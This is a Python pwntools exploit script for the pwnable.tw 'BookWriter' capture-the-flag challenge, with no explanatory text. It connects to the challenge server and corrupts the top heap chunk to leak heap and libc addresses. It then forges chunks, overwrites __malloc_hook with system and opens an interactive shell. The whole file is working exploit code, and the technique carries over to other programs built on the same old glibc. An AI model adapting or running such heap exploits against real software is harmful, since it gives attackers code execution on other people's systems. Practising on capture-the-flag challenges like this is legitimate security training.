#Exploit for pwnable.tw/BookWriter
from pwn import *

elf = ELF("./bookwriter")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")
target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote('chall.pwnable.tw', 10304)

author_name = 0x00602060
page_ptr = 0x006020a0
page_sizes = 0x006020e0
yes = 1
no = 0

def sa(s, d):
	target.sendafter(s, d)

def read_author(name):
	sa(":", name)

def add(size, content):
	sa(":", "1")
	sa(":", str(size))
	sa(":", content)

def view(idx):
	sa(":", "2")
	sa(":", str(idx))

def edit(idx, content):
	sa(":", "3")
	sa(":", str(idx))
	sa(":", content)

def info(c, name = "whoamiT"):
	sa(":", "4")
	target.recvuntil("A"*0x40)
	heap_base = u64(target.recvline().strip().ljust(8, '\x00')) - 0x10
	sa("(yes:1 / no:0) ", str(c) + '\n')
	if c:
		read_author(name)
	return heap_base

#----------------------------------------------Starts here---------------------------------------------
read_author("A"*0x40)

add(0x18, "0")
edit(0, "0"*0x18)
edit(0, "0"*0x18 + '\xe1\x0f\x00')

heap_base = info(no)
log.info("HEAP Base: " + hex(heap_base))

add(0x18, "1")
edit(1, "[+]LEAK:")
view(1)
target.recvuntil("[+]LEAK:")
libc_leak = u64(target.recvline().strip().ljust(8, '\x00'))
libc_base = libc_leak - (0x7f89b6d7b188 - 0x7f89b69b7000)
log.info("LIBC Base: " + hex(libc_base))

edit(0, p64(0))
add(0x90, "2")
add(0x20, "3")
add(0x18, "4")
add(0x18, "5")
add(0x38, "6")
add(0x18, "7")
add(0x18, "8")

fake_chunk = p64(0) + p64(0x91) + p64(libc_leak) + p64(libc_leak)
info(yes, fake_chunk)

edit(0, "a"*0x1c0 + p64(0) + p64(0xe31) + p64(page_ptr + 0x20) + p64(page_ptr + 0x20))
edit(0, p64(0))

add(0xe20, "8")
edit(6, p64(heap_base + 0x22010) + p64(heap_base + 0x1d0) + p64(author_name) + p64(author_name))

edit(0, p64(0))
add(0x80, "/bin/sh\x00" + "A"*0x28 + p64(libc_base + libc.sym['__malloc_hook'] - 0x8))

edit(0, p64(0) + p64(libc_base + libc.sym['system']))

sa(":", "1")
sa(":", str(author_name + 0x10))

target.interactive()